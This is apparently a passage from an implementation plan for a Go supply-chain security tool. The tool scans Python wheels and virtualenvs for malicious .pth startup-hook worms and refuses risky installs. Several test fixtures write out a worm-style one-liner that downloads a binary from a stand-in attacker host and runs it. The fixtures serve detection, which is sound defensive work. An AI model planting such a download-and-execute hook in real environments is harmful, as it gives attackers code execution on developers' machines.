	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
}

func TestInspectTopLevelPathOnlyClean(t *testing.T) {
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-1.0.0.data/purelib/extras.pth": "some/path\nanother/path\n",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

func TestInspectEditablePthClean(t *testing.T) {
	body := `import __editable___mypkg_0_1_0_finder; __editable___mypkg_0_1_0_finder.install()` + "\n"
	r, n := buildWheel(t, map[string]string{
		"foo/__init__.py": "",
		"foo-0.1.0.data/purelib/__editable__.mypkg-0.1.0.pth": body,
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}

func TestInspectIgnoresUnrelatedPaths(t *testing.T) {
	// A .pth-like name inside a tests dir or somewhere outside the data
	// scheme must not be evaluated as a startup hook.
	r, n := buildWheel(t, map[string]string{
		"foo/tests/fixtures/sample.pth": "import urllib.request",
		"foo/__init__.py":               "",
	})
	v, err := wheel.Inspect(r, n)
	require.NoError(t, err)
	require.False(t, v.Flagged())
}
```

- [ ] **Step 3: Run, commit**

```bash
go test ./internal/pthscan/wheel/...
```

All five tests pass.

```bash
git add internal/pthscan/wheel/wheel.go internal/pthscan/wheel/wheel_test.go
git commit -m "feat(pthscan/wheel): in-memory wheel-zip prescan for .pth"
```

---

## Task 5: `pthscan/wheel` live false-positive guard (gated)

**Files:**
- Create: `internal/pthscan/wheel/live_real_test.go`

Gated network-fetching test that pulls a handful of real wheels known to ship `.pth` (`setuptools`, an editable-install scenario) and asserts no `Flagged()` verdict. Mirror `internal/gypscan/tarball/live_real_test.go`. The build-tag/env gate keeps it out of CI by default.

- [ ] **Step 1: Read the upstream gating shape**

```bash
cat internal/gypscan/tarball/live_real_test.go
```

Note the build tag and env-var guard used.

- [ ] **Step 2: Write the live test**

Create `internal/pthscan/wheel/live_real_test.go`:

```go
//go:build live

package wheel_test

import (
	"bytes"
	"io"
	"net/http"
	"os"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan/wheel"
)

// TestInspectLiveSetuptoolsNotFlagged downloads the current setuptools wheel
// from PyPI and asserts that the bundled distutils-precedence.pth does not
// trigger a Flagged() verdict. Gated behind `-tags live` and disabled when
// VETO_SKIP_LIVE_TESTS is set, mirroring the gypscan live guard.
func TestInspectLiveSetuptoolsNotFlagged(t *testing.T) {
	if os.Getenv("VETO_SKIP_LIVE_TESTS") != "" {
		t.Skip("VETO_SKIP_LIVE_TESTS set")
	}
	// Use a stable known-good wheel URL pattern; if the network is down the
	// test fails loudly rather than passing silently.
	const url = "https://files.pythonhosted.org/packages/py3/s/setuptools/setuptools-70.0.0-py3-none-any.whl"
	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Get(url)
	require.NoError(t, err)
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode, "live wheel fetch must succeed")
	body, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	v, err := wheel.Inspect(bytes.NewReader(body), int64(len(body)))
	require.NoError(t, err)
	require.False(t, v.Flagged(), "setuptools.whl flagged: signals=%v", v.Signals)
}
```

- [ ] **Step 3: Verify the gate works (no live run unless asked)**

```bash
go test ./internal/pthscan/wheel/...
```

Expected: the live test does not run (build-tag gated). Then verify the tag works:

```bash
go test -tags live -run TestInspectLiveSetuptoolsNotFlagged -count=1 ./internal/pthscan/wheel/... || echo "skipped or network unavailable"
```

If the live test is currently flaky due to URL drift, leave the URL as written and document with a `@@TODO: stable URL` comment. (Per CLAUDE.md, `@@TODO` is the personal-followup marker — but per this plan's rules, no `@@TODO` should remain at the ship commit. If the URL needs updating, update it before commit.)

- [ ] **Step 4: Commit**

```bash
git add internal/pthscan/wheel/live_real_test.go
git commit -m "test(pthscan/wheel): live false-positive guard against real wheels"
```

---

## Task 6: `internal/scan/pth` — existing-tree scanner

**Files:**
- Create: `internal/scan/pth/pth.go`
- Test: `internal/scan/pth/pth_test.go`

Walks Python environment trees under each root and feeds every `.pth` file to `pthscan.Inspect`. Mirror `internal/scan/gyp/gyp.go`. The walker descends into `site-packages` / `dist-packages` directories under `.venv`, `venv`, and similar — exactly the inverse of the project scanner, which prunes them. Critical → `scan.SeverityCritical`; Medium → `scan.SeverityHigh`.

- [ ] **Step 1: Write the scanner**

Create `internal/scan/pth/pth.go`:

```go
// Package pth scans installed Python environment trees for .pth files that
// match the Hades / Shai-Hulud startup-hook worm pattern.
//
// Where the project scanner prunes virtualenvs (it cares only about
// committed manifests), this one descends into them — an installed worm
// lives in site-packages, not in pyproject.toml. The detector lives in
// internal/pthscan; this package owns the file I/O, ctx cancellation, and
// scan.Finding emission.
package pth

import (
	"context"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/brynbellomy/go-utils/errors"

	"github.com/brynbellomy/veto/internal/pthscan"
	"github.com/brynbellomy/veto/internal/scan"
)

// maxPthBytes caps how much of a single .pth file we read. Real .pth files
// are tiny; an oversized one is treated as unscannable (Critical).
const maxPthBytes = 256 * 1024

// Options configures a .pth scanner.
type Options struct {
	// Roots are the project roots to walk. The scanner descends into every
	// `site-packages` / `dist-packages` directory beneath each root and
	// inside any venv-shaped subdirectory (.venv, venv, env, ...).
	Roots []string
}

// Scanner walks project trees for worm-shaped .pth files.
type Scanner struct {
	roots []string
}

var _ scan.Scanner = (*Scanner)(nil)

// New builds a .pth scanner.
func New(opts Options) *Scanner {
	return &Scanner{roots: append([]string{}, opts.Roots...)}
}

// Scan implements scan.Scanner. It walks each root, finds every .pth file
// inside a site-packages / dist-packages directory, and emits a finding for
// each one pthscan flags.
func (s *Scanner) Scan(ctx context.Context) scan.Result {
	result := scan.Result{}
	for _, root := range s.roots {
		if err := ctx.Err(); err != nil {
			result.Errors = append(result.Errors, err)
			return result
		}
		if root == "" {
			continue
		}
		insideSitePackages := false
		if err := filepath.WalkDir(root, func(path string, entry fs.DirEntry, walkErr error) error {
			if err := ctx.Err(); err != nil {
				return err
			}
			if walkErr != nil {
				result.Errors = append(result.Errors, errors.With(walkErr, "walk pth scan path").Set("path", path))
				if entry != nil && entry.IsDir() {
					return fs.SkipDir
				}
				return nil
			}
			if entry.IsDir() {
				if shouldPruneDir(entry.Name()) {
					return fs.SkipDir
				}
				return nil
			}
			if !strings.HasSuffix(entry.Name(), ".pth") {
				return nil
			}
			// Only consider .pth files that live under a site-packages or
			// dist-packages directory — those are the ones Python's site
			// module loads at startup. .pth files in other locations (test
			// fixtures, source trees) are not loaded and not interesting.
			if !insideSitePackagesPath(path) {
				return nil
			}
			_ = insideSitePackages
			result.FilesScanned++
			finding, err := s.scanPth(path)
			if err != nil {
				result.Errors = append(result.Errors, err)
				return nil
			}
			if finding != nil {
				result.Findings = append(result.Findings, *finding)
			}
			return nil
		}); err != nil {
			result.Errors = append(result.Errors, errors.With(err, "walk pth scan root").Set("root", root))
		}
	}
	return result
}

// insideSitePackagesPath reports whether path lies inside a site-packages
// or dist-packages directory anywhere along its ancestry.
func insideSitePackagesPath(path string) bool {
	for _, seg := range strings.Split(filepath.ToSlash(path), "/") {
		if seg == "site-packages" || seg == "dist-packages" {
			return true
		}
	}
	return false
}

func (s *Scanner) scanPth(path string) (*scan.Finding, error) {
	content, truncated, err := readCapped(path, maxPthBytes)
	if err != nil {
		return nil, errors.With(err, "read .pth").Set("path", path)
	}
	verdict := pthscan.Inspect(pthscan.Input{
		PthContent: content,
		FileName:   filepath.Base(path),
		Truncated:  truncated,
	})
	if !verdict.Flagged() {
		return nil, nil
	}
	severity := scan.SeverityHigh
	if verdict.Severity == pthscan.SeverityCritical {
		severity = scan.SeverityCritical
	}
	evidence := make([]scan.Evidence, 0, len(verdict.Signals))
	for _, sig := range verdict.Signals {
		val := sig.Detail
		if sig.Excerpt != "" {
			val = sig.Detail + " — " + sig.Excerpt
		}
		evidence = append(evidence, scan.Evidence{Label: sig.Code, Value: val})
	}
	return &scan.Finding{
		ID:          "pth:" + string(verdict.Severity) + ":" + path,
		Surface:     scan.SurfaceProject,
		Severity:    severity,
		Path:        path,
		Title:       ".pth file matches startup-hook worm pattern (Hades / Shai-Hulud)",
		Evidence:    evidence,
		Remediation: "Do NOT run python or pip/uv/poetry/pdm in this environment until resolved — site.py executes this .pth at every interpreter startup. Delete the offending package, remove the venv (or clear site-packages), and rotate any credentials reachable from machines that already ran the interpreter in this env.",
	}, nil
}

func readCapped(path string, limit int64) ([]byte, bool, error) {
	f, err := os.Open(path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, false, nil
		}
		return nil, false, err
	}
	defer f.Close()
	buf, err := io.ReadAll(io.LimitReader(f, limit+1))
	if err != nil {
		return nil, false, err
	}
	if int64(len(buf)) > limit {
		return buf[:limit], true, nil
	}
	return buf, false, nil
}

// shouldPruneDir skips directory trees that cannot contain an active site
// hierarchy. node_modules, VCS metadata, mypy/pytest caches are not where
// Python loads .pth files from; pruning keeps the walk cheap.
func shouldPruneDir(name string) bool {
	switch name {
	case ".git", ".hg", ".svn", "node_modules", ".mypy_cache", ".pytest_cache", ".ruff_cache", "__pycache__":
		return true
	default:
		return false
	}
}
```

- [ ] **Step 2: Write the scanner tests**

Create `internal/scan/pth/pth_test.go`:

```go
package pth_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/scan"
	"github.com/brynbellomy/veto/internal/scan/pth"
)

func writeFile(t *testing.T, p, content string) {
	t.Helper()
	require.NoError(t, os.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, os.WriteFile(p, []byte(content), 0o644))
}

const hadesBody = `import urllib.request, subprocess; ` +
	`urllib.request.urlretrieve('https://attacker.tld/bun','/tmp/bun'); ` +
	`subprocess.Popen(['/tmp/bun','/tmp/_index.js'])` + "\n"

func TestScannerFindsWormInVenv(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	writeFile(t, filepath.Join(site, "ensmallen-setup.pth"), hadesBody)
	writeFile(t, filepath.Join(site, "ensmallen", "__init__.py"), "")

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Len(t, res.Findings, 1)
	f := res.Findings[0]
	require.Equal(t, scan.SeverityCritical, f.Severity)
	require.Equal(t, scan.SurfaceProject, f.Surface)
	require.Contains(t, f.Title, "Hades")
	var ev []string
	for _, e := range f.Evidence {
		ev = append(ev, e.Label)
	}
	require.True(t, contains(ev, "pth-payload-network"), "missing network evidence; got %v", ev)
}

func TestScannerIgnoresLegitDistutilsPrecedence(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	body := `import os; __import__('_distutils_hack').add_shim()`
	writeFile(t, filepath.Join(site, "distutils-precedence.pth"), body)

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Empty(t, res.Findings, "legit .pth flagged: %v", res.Findings)
}

func TestScannerIgnoresPthOutsideSitePackages(t *testing.T) {
	root := t.TempDir()
	// A .pth file in the source tree, NOT inside a site-packages dir, must
	// be ignored — Python's site module never loads it.
	writeFile(t, filepath.Join(root, "src", "myproj", "fixtures", "sample.pth"), `import urllib.request`)

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Empty(t, res.Findings)
}

func TestScannerFailsClosedOnOversize(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	// 300 KiB > 256 KiB cap.
	body := strings.Repeat("foo/bar\n", 50_000)
	writeFile(t, filepath.Join(site, "huge.pth"), body)

	res := pth.New(pth.Options{Roots: []string{root}}).Scan(context.Background())
	require.Empty(t, res.Errors)
	require.Len(t, res.Findings, 1)
	require.Equal(t, scan.SeverityCritical, res.Findings[0].Severity)
}

func TestScannerRespectsContextCancellation(t *testing.T) {
	root := t.TempDir()
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	res := pth.New(pth.Options{Roots: []string{root}}).Scan(ctx)
	require.NotEmpty(t, res.Errors)
}

func contains(s []string, want string) bool {
	for _, x := range s {
		if x == want {
			return true
		}
	}
	return false
}
```

- [ ] **Step 3: Run and commit**

```bash
go test ./internal/scan/pth/...
```

```bash
git add internal/scan/pth/pth.go internal/scan/pth/pth_test.go
git commit -m "feat(scan/pth): existing-tree .pth scanner"
```

---

## Task 7: Install hot path — existing-tree `pth` preflight in cmd/veto

**Files:**
- Create: `cmd/veto/pth_preflight.go`
- Modify: `cmd/veto/main.go`
- Test: `cmd/veto/pth_preflight_test.go`

Mirror `cmd/veto/gyp_preflight.go`. Only Critical findings refuse the install (Medium structural anomalies surface in `veto scan` but don't block the hot path — a false block stops real work). The preflight applies to Python-family ecosystems (PyPI).

- [ ] **Step 1: Write the preflight wrapper**

Create `cmd/veto/pth_preflight.go`:

```go
package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/rs/zerolog"

	"github.com/brynbellomy/veto/internal/intel"
	"github.com/brynbellomy/veto/internal/packagemanager"
	"github.com/brynbellomy/veto/internal/scan"
	"github.com/brynbellomy/veto/internal/scan/pth"
)

// pthPreflightTimeout bounds the existing-tree .pth scan. Walking a project's
// virtualenvs is typically sub-second; the cap stops a pathological tree from
// stalling an install.
const pthPreflightTimeout = 30 * time.Second

// isPythonFamily reports whether an ecosystem resolves PyPI packages — i.e.
// whether site.py could load a .pth at interpreter startup.
func isPythonFamily(eco intel.Ecosystem) bool {
	return eco == intel.EcosystemPyPI
}

// pthPreflightRoots scans the given roots' venvs for the Hades / Shai-Hulud
// startup-hook worm before a Python-family install runs. Fail-OPEN on its own
// errors (walk error / unreadable file): this is an additive heuristic, not a
// fail-closed gate. Critical findings always refuse.
func pthPreflightRoots(logger zerolog.Logger, w io.Writer, roots []string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), pthPreflightTimeout)
	defer cancel()

	result := pth.New(pth.Options{Roots: roots}).Scan(ctx)
	for _, err := range result.Errors {
		logger.Warn().Err(err).Msg(".pth preflight scan error (non-fatal; continuing)")
	}

	critical := dedupePthFindings(criticalPthFindings(result.Findings))
	if len(critical) == 0 {
		return false
	}
	printPthRefusal(w, critical)
	return true
}

func criticalPthFindings(findings []scan.Finding) []scan.Finding {
	var out []scan.Finding
	for _, f := range findings {
		if f.Severity == scan.SeverityCritical {
			out = append(out, f)
		}
	}
	return out
}

func dedupePthFindings(findings []scan.Finding) []scan.Finding {
	seen := map[string]struct{}{}
	out := make([]scan.Finding, 0, len(findings))
	for _, f := range findings {
		key := f.Path
		if key == "" {
			key = f.ID
		}
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		out = append(out, f)
	}
	return out
}

func printPthRefusal(w io.Writer, findings []scan.Finding) {
	fmt.Fprintln(w, "veto: install refused — .pth startup-hook worm detected (Hades / Shai-Hulud):")
	for _, f := range findings {
		fmt.Fprintf(w, "  - %s\n", f.Path)
		for _, ev := range f.Evidence {
			fmt.Fprintf(w, "      [%s] %s\n", ev.Label, ev.Value)
		}
	}
	fmt.Fprintln(w, "\nThis .pth is exec()'d by Python at every interpreter startup, so a pip/uv/poetry/pdm")
	fmt.Fprintln(w, "install in this environment would detonate the worm before the install completes.")
	fmt.Fprintln(w, "Delete the package, remove the venv (or clear site-packages), and rotate any credentials")
	fmt.Fprintln(w, "reachable from machines that already ran python here.")
}

// runPthPreflightIfPythonFamily runs the .pth preflight when the package
// manager resolves PyPI packages. Returns true when the install must refuse.
func runPthPreflightIfPythonFamily(logger zerolog.Logger, pm packagemanager.PackageManager, pmArgs []string) bool {
	if !isPythonFamily(pm.Ecosystem()) {
		return false
	}
	cwd, err := os.Getwd()
	if err != nil {
		logger.Warn().Err(err).Msg(".pth preflight: resolve cwd failed; skipping")
		return false
	}
	return pthPreflightRoots(logger, os.Stderr, pthScanRootsForInstall(pm.Name(), pmArgs, cwd))
}

// pthScanRootsForInstall picks the venvs the install will affect: the
// argv-named target dir (e.g. `pip install --target ./vendor`) if present,
// plus cwd. The walker descends into any .venv/venv beneath these.
func pthScanRootsForInstall(pmName string, pmArgs []string, cwd string) []string {
	seen := map[string]struct{}{}
	roots := make([]string, 0, 2)
	add := func(root string) {
		if root == "" {
			return
		}
		clean := filepath.Clean(root)
		if _, ok := seen[clean]; ok {
			return
		}
		seen[clean] = struct{}{}
		roots = append(roots, clean)
	}
	add(installTargetDir(pmName, pmArgs, cwd))
	add(cwd)
	return roots
}
```

- [ ] **Step 2: Wire the preflight into main.go**

Read `cmd/veto/main.go:438-454` (the existing npm-family block) for the exact shape. Then locate that block and append a parallel Python-family block immediately after the closing brace of the `if isNpmFamily(pm.Ecosystem())` block:

```go
		// Hades / Shai-Hulud .pth startup-hook worm layers. The intel gate
		// above cannot see this worm — it rides a trusted name and keeps
		// package metadata clean — so for Python-family installs we apply
		// the same two content heuristics before letting the real package
		// manager run.
		if isPythonFamily(pm.Ecosystem()) {
			// (a) Wheel prescan: fetch the wheels about to be installed
			// (Task 8) and inspect each .pth they would drop. Catches a
			// freshly-resolved/compromised version that is not yet in any
			// intel feed. Wired below; Task 8 fills the body.
			if pthWheelPreflight(logger, os.Stderr, cfg, installs, preScanInstalls) {
				return exitRefused
			}
			// (b) Existing-tree scan: site.py loads every .pth at every
			// `python` startup, so a worm already in the target venv would
			// detonate before this install completes. Scan it.
			if runPthPreflightIfPythonFamily(logger, pm, pmArgs) {
				return exitRefused
			}
		}
```

(The `pthWheelPreflight` call won't compile yet; the next task adds it. Stage and commit each task on its own — interim red is fine while you iterate; the final commit MUST be green.)

- [ ] **Step 3: Stub `pthWheelPreflight` so the build stays green**

Create a stub at the top of `cmd/veto/pth_wheel.go` so this task compiles cleanly. Task 8 replaces the body.

```go
package main

import (
	"io"

	"github.com/rs/zerolog"

	"github.com/brynbellomy/veto/internal/packagemanager"
)

// pthWheelPreflight: stub introduced in Task 7; real implementation lands in
// Task 8. Returns false (no refusal) so the install hot path stays open until
// the wheel prescan is wired in.
func pthWheelPreflight(
	_ zerolog.Logger,
	_ io.Writer,
	_ config,
	_, _ []packagemanager.Install,
) bool {
	return false
}
```

- [ ] **Step 4: Write the preflight unit test**

Create `cmd/veto/pth_preflight_test.go`:

```go
package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/require"
)

func writePth(t *testing.T, p, content string) {
	t.Helper()
	require.NoError(t, os.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, os.WriteFile(p, []byte(content), 0o644))
}

func TestPthPreflightRefusesOnWormHit(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	writePth(t, filepath.Join(site, "ensmallen-setup.pth"),
		`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n")

	var buf bytes.Buffer
	refused := pthPreflightRoots(zerolog.Nop(), &buf, []string{root})
	require.True(t, refused)
	require.True(t, strings.Contains(buf.String(), "Hades"), "want 'Hades' in output; got %q", buf.String())
}

func TestPthPreflightAllowsCleanVenv(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	writePth(t, filepath.Join(site, "distutils-precedence.pth"),
		`import os; __import__('_distutils_hack').add_shim()`)

	var buf bytes.Buffer
	refused := pthPreflightRoots(zerolog.Nop(), &buf, []string{root})
	require.False(t, refused)
}
```

- [ ] **Step 5: Run and commit**

```bash
go build ./... && go test ./cmd/veto/... -run TestPthPreflight
```

```bash
git add cmd/veto/pth_preflight.go cmd/veto/pth_wheel.go cmd/veto/pth_preflight_test.go cmd/veto/main.go
git commit -m "feat(cmd): wire .pth existing-tree preflight into Python-family install hot path"
```

---

## Task 8: Install hot path — wheel prescan in cmd/veto

**Files:**
- Modify: `cmd/veto/pth_wheel.go` (replaces the Task-7 stub with the real implementation)
- Test: `cmd/veto/pth_wheel_test.go`

Mirror `cmd/veto/gyp_tarball.go`. Use `pip download --no-deps --no-build-isolation --no-binary :none: --only-binary :all: <spec> -d <tmp>` to fetch the wheel without installing or running setup.py (the `--only-binary :all:` flag forbids sdist building outright). Inspect each downloaded `.whl` in memory via `pthscan/wheel.Inspect`. `VETO_PTH_WHEEL_SCAN` controls scope: default-on for argv-direct, `=full` to also fetch resolved transitives, `=off` to disable. Fail-OPEN on veto's own fetch/parse errors; Critical findings always refuse.

- [ ] **Step 1: Replace the stub with the real implementation**

Overwrite `cmd/veto/pth_wheel.go` (the Task-7 stub):

```go
package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/rs/zerolog"

	"github.com/brynbellomy/veto/internal/intel"
	"github.com/brynbellomy/veto/internal/packagemanager"
	"github.com/brynbellomy/veto/internal/pthscan"
	"github.com/brynbellomy/veto/internal/pthscan/wheel"
)

// pthWheelScanTimeout bounds the whole wheel-download-and-inspect pass.
// Each `pip download` is a network fetch; the cap keeps a slow registry
// from stalling the install indefinitely.
const pthWheelScanTimeout = 120 * time.Second

// pthWheelScanMode reads VETO_PTH_WHEEL_SCAN.
//   - off / 0 / false / no  → disabled
//   - full / all / transitive → fetch every resolved install too
//   - anything else (default) → argv-direct only
func pthWheelScanMode() (enabled bool, full bool) {
	switch os.Getenv("VETO_PTH_WHEEL_SCAN") {
	case "0", "off", "false", "no":
		return false, false
	case "full", "all", "transitive":
		return true, true
	default:
		return true, false
	}
}

// pthWheelPreflight downloads and inspects wheels for the Hades / Shai-Hulud
// .pth startup-hook worm BEFORE the real install extracts them and the next
// `python` startup loads them. Mirrors the gyp_tarball preflight.
//
// Fail-OPEN on its own errors (network failure, pip error, timeout): this is
// an additive heuristic layer, and a registry hiccup must not block every
// install. Critical findings always refuse.
func pthWheelPreflight(
	logger zerolog.Logger,
	w io.Writer,
	cfg config,
	directInstalls []packagemanager.Install,
	resolvedInstalls []packagemanager.Install,
) bool {
	enabled, full := pthWheelScanMode()
	if !enabled {
		return false
	}

	targets := selectWheelTargets(directInstalls, resolvedInstalls, full)
	if len(targets) == 0 {
		return false
	}

	realPip, err := findRealBinary("pip", wrapperRegisteredFunc(cfg))
	if err != nil {
		logger.Warn().Err(err).Msg(".pth wheel preflight: cannot locate real pip; skipping")
		return false
	}

	workdir, err := os.MkdirTemp("", "veto-pth-download-*")
	if err != nil {
		logger.Warn().Err(err).Msg(".pth wheel preflight: mkdtemp failed; skipping")
		return false
	}
	defer os.RemoveAll(workdir)

	ctx, cancel := context.WithTimeout(context.Background(), pthWheelScanTimeout)
	defer cancel()

	var flagged []wheelFinding
	for _, tgt := range targets {
		if err := ctx.Err(); err != nil {
			logger.Warn().Err(err).Msg(".pth wheel preflight: timed out; allowing (fail-open)")
			break
		}
		verdict, err := downloadAndInspectWheel(ctx, realPip, workdir, tgt)
		if err != nil {
			logger.Warn().Err(err).Str("spec", tgt.spec()).Msg(".pth wheel preflight: fetch/inspect failed; skipping this package")
			continue
		}
		if verdict.Severity == pthscan.SeverityCritical {
			flagged = append(flagged, wheelFinding{spec: tgt.spec(), verdict: verdict})
		}
	}

	if len(flagged) == 0 {
		return false
	}
	printWheelRefusal(w, flagged)
	return true
}

type wheelTarget struct {
	name    string
	version string
}

func (t wheelTarget) spec() string {
	if t.version == "" {
		return t.name
	}
	return t.name + "==" + t.version
}

type wheelFinding struct {
	spec    string
	verdict pthscan.Verdict
}

func selectWheelTargets(direct, resolved []packagemanager.Install, full bool) []wheelTarget {
	resolvedVer := map[string]string{}
	for _, ins := range resolved {
		if ins.Ref.Ecosystem == intel.EcosystemPyPI && ins.Ref.Name != "" && ins.Ref.Version != "" {
			resolvedVer[ins.Ref.Name] = ins.Ref.Version
		}
	}

	seen := map[string]struct{}{}
	var out []wheelTarget
	add := func(name, version string) {
		if name == "" {
			return
		}
		if v, ok := resolvedVer[name]; ok && version == "" {
			version = v
		}
		key := name + "@" + version
		if _, dup := seen[key]; dup {
			return
		}
		seen[key] = struct{}{}
		out = append(out, wheelTarget{name: name, version: version})
	}

	for _, ins := range direct {
		if ins.Ref.Ecosystem != intel.EcosystemPyPI || ins.LocalPath || ins.OpaqueRemote {
			continue
		}
		add(ins.Ref.Name, ins.Ref.Version)
	}
	if full {
		for _, ins := range resolved {
			if ins.Ref.Ecosystem != intel.EcosystemPyPI || ins.LocalPath || ins.OpaqueRemote {
				continue
			}
			add(ins.Ref.Name, ins.Ref.Version)
		}
	}
	return out
}

// downloadAndInspectWheel downloads one package's wheel with `pip download
// --no-deps --only-binary :all:` (no sdist building; wheels only) into
// workdir and inspects it in memory. The wheel is never installed.
func downloadAndInspectWheel(ctx context.Context, realPip, workdir string, tgt wheelTarget) (pthscan.Verdict, error) {
	before, err := whlSet(workdir)
	if err != nil {
		return pthscan.Verdict{}, err
	}
	cmd := exec.CommandContext(ctx, realPip,
		"download", tgt.spec(),
		"--no-deps", "--only-binary", ":all:",
		"--dest", workdir, "--quiet",
		"--disable-pip-version-check",
	)
	cmd.Dir = workdir
	cmd.Env = sanitizedEnv(os.Environ())
	if out, err := cmd.CombinedOutput(); err != nil {
		return pthscan.Verdict{}, fmt.Errorf("pip download %s: %w (%s)", tgt.spec(), err, truncateForError(string(out), 400))
	}

	whlPath, err := newlyWrittenWhl(workdir, before)
	if err != nil {
		return pthscan.Verdict{}, err
	}
	if whlPath == "" {
		return pthscan.Verdict{}, fmt.Errorf("pip download %s produced no wheel (only-binary forbids sdist; package may not publish wheels)", tgt.spec())
	}

	f, err := os.Open(whlPath)
	if err != nil {
		return pthscan.Verdict{}, err
	}
	defer f.Close()
	defer os.Remove(whlPath)
	info, err := f.Stat()
	if err != nil {
		return pthscan.Verdict{}, err
	}
	return wheel.Inspect(f, info.Size())
}

func whlSet(dir string) (map[string]struct{}, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	set := map[string]struct{}{}
	for _, e := range entries {
		if !e.IsDir() && filepath.Ext(e.Name()) == ".whl" {
			set[e.Name()] = struct{}{}
		}
	}
	return set, nil
}

func newlyWrittenWhl(dir string, before map[string]struct{}) (string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if e.IsDir() || filepath.Ext(e.Name()) != ".whl" {
			continue
		}
		if _, existed := before[e.Name()]; !existed {
			return filepath.Join(dir, e.Name()), nil
		}
	}
	return "", nil
}

func printWheelRefusal(w io.Writer, findings []wheelFinding) {
	fmt.Fprintln(w, "veto: install refused — a wheel about to be installed carries a .pth startup-hook worm (Hades / Shai-Hulud):")
	for _, f := range findings {
		fmt.Fprintf(w, "  - %s\n", f.spec)
		for _, sig := range f.verdict.Signals {
			val := sig.Detail
			if sig.Excerpt != "" {
				val = sig.Detail + " — " + sig.Excerpt
			}
			fmt.Fprintf(w, "      [%s] %s\n", sig.Code, val)
		}
	}
	fmt.Fprintln(w, "\nThis wheel ships a `.pth` that Python would exec() at every interpreter startup,")
	fmt.Fprintln(w, "so installing it would detonate the worm on the next `python` call. The wheel was")
	fmt.Fprintln(w, "downloaded for inspection only and never installed. Do NOT install it; the package")
	fmt.Fprintln(w, "name may be a trusted one compromised via account takeover.")
}
```

- [ ] **Step 2: Write the unit test for target selection and env toggle**

Create `cmd/veto/pth_wheel_test.go`:

```go
package main

import (
	"os"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/intel"
	"github.com/brynbellomy/veto/internal/packagemanager"
)

func ins(name, version string, eco intel.Ecosystem) packagemanager.Install {
	return packagemanager.Install{Ref: intel.PackageRef{Ecosystem: eco, Name: name, Version: version}}
}

func TestPthWheelScanModeDefaults(t *testing.T) {
	t.Setenv("VETO_PTH_WHEEL_SCAN", "")
	enabled, full := pthWheelScanMode()
	require.True(t, enabled)
	require.False(t, full)
}

func TestPthWheelScanModeOff(t *testing.T) {
	t.Setenv("VETO_PTH_WHEEL_SCAN", "off")
	enabled, _ := pthWheelScanMode()
	require.False(t, enabled)
}

func TestPthWheelScanModeFull(t *testing.T) {
	t.Setenv("VETO_PTH_WHEEL_SCAN", "full")
	enabled, full := pthWheelScanMode()
	require.True(t, enabled)
	require.True(t, full)
}

func TestSelectWheelTargetsDirectOnly(t *testing.T) {
	direct := []packagemanager.Install{ins("ensmallen", "", intel.EcosystemPyPI)}
	resolved := []packagemanager.Install{ins("ensmallen", "0.8.6", intel.EcosystemPyPI), ins("transitive", "1.0", intel.EcosystemPyPI)}
	got := selectWheelTargets(direct, resolved, false)
	require.Len(t, got, 1)
	require.Equal(t, "ensmallen==0.8.6", got[0].spec()) // resolver version upgrade applied
}

func TestSelectWheelTargetsFull(t *testing.T) {
	direct := []packagemanager.Install{ins("ensmallen", "", intel.EcosystemPyPI)}
	resolved := []packagemanager.Install{ins("ensmallen", "0.8.6", intel.EcosystemPyPI), ins("transitive", "1.0", intel.EcosystemPyPI)}
	got := selectWheelTargets(direct, resolved, true)
	require.Len(t, got, 2)
}

func TestSelectWheelTargetsSkipsNonPyPI(t *testing.T) {
	direct := []packagemanager.Install{ins("evil", "", intel.EcosystemNPM)}
	got := selectWheelTargets(direct, nil, false)
	require.Empty(t, got)
}

func TestSelectWheelTargetsSkipsLocalAndOpaque(t *testing.T) {
	direct := []packagemanager.Install{
		{Ref: intel.PackageRef{Ecosystem: intel.EcosystemPyPI, Name: "./local"}, LocalPath: true},
